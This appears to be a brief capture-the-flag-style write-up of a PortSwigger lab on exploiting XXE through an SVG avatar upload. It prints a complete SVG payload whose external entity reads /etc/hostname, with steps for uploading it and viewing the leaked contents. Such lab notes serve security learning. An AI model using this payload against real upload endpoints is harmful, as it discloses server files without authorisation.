# [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

> SVG file upload to exploit vulnerability

- some documents are xml under the hood, like SVG or DOCX
- in this case an avatar needed to be uploaded and that accepts an SVG file

> the exploit

- `/etc/hostname` is the target in this lab
- create an xml file like this

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname" >
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
    xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

- and then change its extension from `.xml` to `.svg`
- in one of the blog upload the SVG file as avatar
- on blog reload the svg will contain the `/etc/hostname` file content
